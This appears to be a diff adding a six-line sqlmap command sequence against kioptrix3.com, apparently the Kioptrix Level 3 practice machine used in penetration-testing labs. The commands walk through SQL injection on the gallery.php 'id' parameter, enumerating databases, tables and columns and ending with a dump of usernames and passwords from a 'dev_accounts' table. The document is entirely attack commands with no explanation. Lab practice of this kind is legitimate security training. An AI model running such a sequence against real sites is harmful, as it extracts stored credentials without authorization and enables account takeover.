@@ -1,0 +1,6 @@
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1"
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id --flush-session
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id --dbs
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id -D gallery --tables
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id -D gallery -T dev_accounts --columns
+sqlmap -u "http://kioptrix3.com/gallery/gallery.php?id=1&sort=photoid#photos" -p id -D gallery -T dev_accounts -C username,password --dump
